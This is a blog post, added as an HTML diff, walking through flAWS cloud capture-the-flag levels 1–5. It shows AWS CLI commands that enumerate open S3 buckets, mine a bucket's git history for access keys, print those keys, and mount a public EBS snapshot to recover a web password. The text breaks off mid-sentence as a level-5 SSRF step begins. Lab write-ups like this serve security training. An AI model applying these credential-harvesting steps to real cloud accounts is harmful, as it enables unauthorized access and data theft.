@@ -1,0 +1,519 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="flAWS 1" /><meta property="og:locale" content="en" /><meta name="description" content="Level 1" /><meta property="og:description" content="Level 1" /><link rel="canonical" href="https://tanishq.page/blog//blog/posts/flaws-1/" /><meta property="og:url" content="https://tanishq.page/blog//blog/posts/flaws-1/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-31T02:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="flAWS 1" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-31T02:00:00-05:00","datePublished":"2022-03-31T02:00:00-05:00","description":"Level 1","headline":"flAWS 1","mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog//blog/posts/flaws-1/"},"url":"https://tanishq.page/blog//blog/posts/flaws-1/"}</script><title>flAWS 1 | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" class="mx-auto"> <img src="/blog/assets/Abstract.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/blog/">Tanishq Rupaal</a></div><div class="site-subtitle font-italic">Cybersecurity Professional</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/blog/"> Home </a> </span> <span>flAWS 1</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>flAWS 1</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1648710000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 31, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2271 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h2 id="level-1"><span class="mr-2">Level 1</span><a href="#level-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>This level is <em>buckets</em> of fun. See if you can find the first sub-domain.</p></blockquote><p>Begin with doing a <code class="language-plaintext highlighter-rouge">dig</code> of <code class="language-plaintext highlighter-rouge">flaws.cloud</code>, which returns the following →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; flaws.cloud
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 55678
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 85e57acc1b19ec52 (echoed)
+;; QUESTION SECTION:
+;flaws.cloud.                   IN      A
+
+;; ANSWER SECTION:
+flaws.cloud.            15      IN      A       52.92.212.219
+
+;; Query time: 531 msec
+;; SERVER: 192.168.65.5#53(192.168.65.5)
+;; WHEN: Thu Mar 31 21:09:06 CDT 2022
+;; MSG SIZE  rcvd: 79
+</pre></table></code></div></div><p>Then do an <code class="language-plaintext highlighter-rouge">nslookup</code> for the IP found, which gives the following →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>219.212.92.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.
+Authoritative answers can be found from:
+
+</pre></table></code></div></div><p>This gives hint of a static website running from S3 at <code class="language-plaintext highlighter-rouge">s3-website-us-west-2.amazonaws.com</code>. This also confirms that the non-DNS URL for the challenge is at <code class="language-plaintext highlighter-rouge">flaws.cloud.s3-website-us-west-2.amazonaws.com</code>.</p><p>Now, a new profile for <code class="language-plaintext highlighter-rouge">flaws</code> can be created with the region set to <code class="language-plaintext highlighter-rouge">us-west-2</code> and given that S3 is being used, permissions can be checked using the following →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="c"># no sign request is used to call without credentials</span>
+awsn s3 <span class="nb">ls </span>s3://flaws.cloud <span class="nt">--no-sign-request</span> <span class="nt">--profile</span> flaws
+</pre></table></code></div></div><p>This gives the result →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>2017-03-13 22:00:38       2575 hint1.html
+2017-03-02 22:05:17       1707 hint2.html
+2017-03-02 22:05:11       1101 hint3.html
+2020-05-22 13:16:45       3162 index.html
+2018-07-10 11:47:16      15979 logo.png
+2017-02-26 19:59:28         46 robots.txt
+2017-02-26 19:59:30       1051 secret-dd02c7c.html
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">robots.txt</code> and <code class="language-plaintext highlighter-rouge">secret-dd02c7c.html</code> seem interesting.</p><p>These can be retrieved using the command →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>aws s3 <span class="nb">cp </span>s3://flaws.cloud/robots.txt ./
+</pre></table></code></div></div><p>The robots file did not give anything but the secret file gave the link to the next level as <code class="language-plaintext highlighter-rouge">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code>. Files can also be listed by directly going to <code class="language-plaintext highlighter-rouge">flaws.cloud.s3.amazonaws.com</code>.</p><hr /><h2 id="level-2"><span class="mr-2">Level 2</span><a href="#level-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>The next level is fairly similar, with a slight twist. You’re going to need your own AWS account for this. You just need the free tier.</p></blockquote><p>Calling <code class="language-plaintext highlighter-rouge">s3 ls</code> again on the discovered bucket gives an access denied message →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> aws s3 <span class="nb">ls </span>s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud <span class="nt">--no-sign-request</span>
+</pre></table></code></div></div><p>However, calling it with a valid profile lists the bucket which means that the bucket did not have proper permissions configured i.e., it allowed everyone to list items and get items. Retrieving the secret file gives the URL for the next level as → <code class="language-plaintext highlighter-rouge">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</code>.</p><hr /><h2 id="level-3"><span class="mr-2">Level 3</span><a href="#level-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you’ll find something that will let you list what other buckets are.</p></blockquote><p>Listing the contents like previous parts gives a <code class="language-plaintext highlighter-rouge">.git</code> folder in the contents. Pulling that down as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>aws s3 <span class="nb">cp</span> <span class="nt">--recursive</span> s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git ./git_stuff/
+</pre></table></code></div></div><p>Running a secret scan in all commits using →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>git <span class="nt">--no-pager</span> log | <span class="nb">grep</span> <span class="s2">"^commit"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span>git checkout <span class="nv">$i</span> 1&gt;/dev/null 2&gt;/dev/null<span class="p">;</span> zsh /persist/secret_scan.sh<span class="p">;</span> <span class="k">done</span>
+</pre></table></code></div></div><p>This gives a secret → <code class="language-plaintext highlighter-rouge">access_keys.txt:1:AKIAJ366LIPB4IJKT7SA</code> and <code class="language-plaintext highlighter-rouge">access_keys.txt:2:secret_access_key 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</code></p><p>Using this as a profile, all S3 buckets can be listed using →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn s3 <span class="nb">ls</span> <span class="nt">--proile</span> flaws
+</pre></table></code></div></div><p>This gives the following output →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>2017-02-12 15:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2017-05-29 11:34:53 config-bucket-975426262029
+2017-02-12 14:03:24 flaws-logs
+2017-02-04 21:40:07 flaws.cloud
+2017-02-23 19:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-26 12:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2017-02-26 12:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2017-02-26 13:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2017-02-26 13:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2017-02-26 14:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
+</pre></table></code></div></div><p>This is all the S3 buckets which are also the further levels.</p><hr /><h2 id="level-4"><span class="mr-2">Level 4</span><a href="#level-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Visiting the bucket static website at → <code class="language-plaintext highlighter-rouge">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/</code></p><blockquote class="prompt-info"><p>For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</p><p>It’ll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.</p></blockquote><p>Using <code class="language-plaintext highlighter-rouge">aws sts get-caller-identitity --profile flaws</code> it gives the name of the account which is <code class="language-plaintext highlighter-rouge">backup</code>.</p><p>The questions says that a snapshot was made from the EC2 instance running the website. Using <code class="language-plaintext highlighter-rouge">aws ec2 describe-instances</code>, there is an instance owned by the backup user.</p><p>Listing all snapshots using <code class="language-plaintext highlighter-rouge">aws ec2 describe-snapshots</code> prints a ton of text, therefore, we filter using the owner ID such that the owner is the <code class="language-plaintext highlighter-rouge">backup</code> user. This is done by using <code class="language-plaintext highlighter-rouge">aws ec2 describe-snapshots --owner-id 975426262029</code> which gives the result →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"Snapshots"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"Description"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Encrypted"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"OwnerId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"975426262029"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Progress"</span><span class="p">:</span><span class="w"> </span><span class="s2">"100%"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"SnapshotId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"snap-0b49342abd1bdcb89"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"StartTime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-28T01:35:12+00:00"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"State"</span><span class="p">:</span><span class="w"> </span><span class="s2">"completed"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"VolumeId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vol-04f1c039bc13ea950"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"VolumeSize"</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                </span><span class="p">{</span><span class="w">
+                    </span><span class="nl">"Key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Name"</span><span class="p">,</span><span class="w">
+                    </span><span class="nl">"Value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"flaws backup 2017.02.27"</span><span class="w">
+                </span><span class="p">}</span><span class="w">
+            </span><span class="p">],</span><span class="w">
+            </span><span class="nl">"StorageTier"</span><span class="p">:</span><span class="w"> </span><span class="s2">"standard"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>On checking the permissions for the volume using →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn ec2 describe-snapshot-attribute <span class="nt">--attribute</span> createVolumePermission <span class="nt">--snapshot-id</span> snap-0b49342abd1bdcb89 <span class="nt">--profile</span> flaws <span class="nt">--region</span> us-west-2
+</pre></table></code></div></div><p>The result is as follows →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"CreateVolumePermissions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"Group"</span><span class="p">:</span><span class="w"> </span><span class="s2">"all"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">],</span><span class="w">
+    </span><span class="nl">"SnapshotId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"snap-0b49342abd1bdcb89"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>By default snapshots are private, and you can transfer them between accounts securely by specifying the account ID of the other account, but a number of people just make them public and forget about them.</p><p>Therefore, creating a volume from this within personal account using →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn ec2 create-volume <span class="nt">--snapshot-id</span> snap-0b49342abd1bdcb89 <span class="nt">--availability-zone</span> us-west-2a <span class="nt">--region</span> us-west-2
+</pre></table></code></div></div><p>It must be in the same region as the snapshot because snapshots cannot be shared on other regions. The result is as follows →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"AvailabilityZone"</span><span class="p">:</span><span class="w"> </span><span class="s2">"us-west-2a"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"CreateTime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-01T15:48:24+00:00"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"Encrypted"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"Size"</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"SnapshotId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"snap-0b49342abd1bdcb89"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"State"</span><span class="p">:</span><span class="w"> </span><span class="s2">"creating"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"VolumeId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vol-08854891211c6fec5"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"Iops"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
+    </span><span class="nl">"VolumeType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"gp2"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"MultiAttachEnabled"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>Now, an EC2 instance can be created from the console in the same AZ and then this volume can be attached to its storage.</p><p>Upon attaching the volume to the instance, it can be mounted as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>lsblk
+<span class="c"># This gives the volume /dev/xvdf1 as a new volume This should be from the snapshot</span>
+<span class="nb">sudo </span>mount /dev/xvdf1 /mnt
+<span class="c"># This mounts it to the /mnt directory</span>
+</pre></table></code></div></div><p>Searching the file system, there is a <code class="language-plaintext highlighter-rouge">/home</code> directory for users on the system and the only user there is <code class="language-plaintext highlighter-rouge">ubuntu</code>. Since this snapshot was taken after the NGINX web server was configured and launched, there must be some data relevant to it. Under <code class="language-plaintext highlighter-rouge">ubuntu</code>‘s home directory, there is a script <code class="language-plaintext highlighter-rouge">setupNginx.sh</code> which has the following in it →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
+</pre></table></code></div></div><p>This gives the password for the web server running in the EC2 instance at <code class="language-plaintext highlighter-rouge">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</code>.</p><hr /><h2 id="level-5"><span class="mr-2">Level 5</span><a href="#level-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>This EC2 has a simple HTTP only proxy on it. Here are some examples of it’s usage:<br /> <code class="language-plaintext highlighter-rouge">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/</code><br /> <code class="language-plaintext highlighter-rouge">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml</code><br /> <code class="language-plaintext highlighter-rouge">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/</code><br /> See if you can use this proxy to figure out how to list the contents of the level6 bucket at <code class="language-plaintext highlighter-rouge">level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</code> that has a hidden directory in it.</p><p>Visiting the page directly at <code class="language-plaintext highlighter-rouge">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/</code> gives the error of → Level 6 is hosted in a sub-directory, but to figure out that directory, you need to play level 5 properly.</p></blockquote><p>One of the most common ways to escalate an SSRF in an AWS Cloud environment is the (mis)use of the 